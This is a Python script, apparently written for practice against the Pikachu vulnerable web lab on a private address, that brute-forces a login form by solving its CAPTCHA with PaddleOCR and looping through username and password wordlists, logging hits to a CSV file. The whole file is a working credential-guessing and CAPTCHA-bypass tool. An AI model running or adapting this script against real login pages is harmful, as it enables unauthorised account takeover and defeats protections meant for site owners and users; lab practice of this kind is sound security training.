import requests
from paddleocr import PaddleOCR


def dama():
    url = "http://192.168.19.100/pikachu/inc/showvcode.php"

    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
        'Cookie': 'PHPSESSID=17u0i2fakm84eq9oc24boc8715'
    }

    r = requests.get(url, headers=header)

    with open('code.PNG', 'wb') as fp:
        fp.write(r.content)

    ocr=PaddleOCR(use_angle_cls = True,use_gpu= False) #使用CPU预加载，不用GPU

    text=ocr.ocr("code.PNG",cls=True)

    #打印所有文本信息
    a = 0
    for t in text:
        a = (t[1][0])

    return a




url = "http://192.168.19.100/pikachu/vul/burteforce/bf_server.php"
# proxies = {"http": "http://127.0.0.1:8080"}  # 代理设置，方便burp抓包查看和调试
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
    'Cookie': 'PHPSESSID=17u0i2fakm84eq9oc24boc8715'
}


if __name__ == "__main__":
    f = open('result.csv', 'w')  # 把爆破结果储存到文件里，这里为csv格式
    f.write('用户名' + ',' + '密码' + ',' + '结果' + '\n')  # 给文件设置标题

    # 遍历字典文件，Cluster bomb 暴力破解
    for admin in open("账号.txt"):
        for line in open("密码.txt"):
            username = admin.strip()
            password = line.strip()
            vcode = dama()
            payload = {  # payload为POST的数据
                'username': username,
                'password': password,
                'vcode': vcode,
                'submit': 'Login'
            }


            success = "<p> login success</p>"
            yzm = "验证码输入错误哦！"
            Response = requests.post(url, data=payload, headers=header)
            if str(Response.text).find(success) != -1:
                result = username + ',' + password + ',' + 'login success'
            elif str(Response.text).find(yzm) != -1:
                result = username + ',' + password + ',' + yzm
            else:
                result = username + ',' + password + ',' + 'username or password is not exists～'  # 用户名密码以及响应包长度

            print(result)  # 输出到终端
            f.write(result + '\n')  # 输出到文件
              # 调用get_token函数获取下一次循环需要的token
    print('\n---完成---\n')
    f.close()
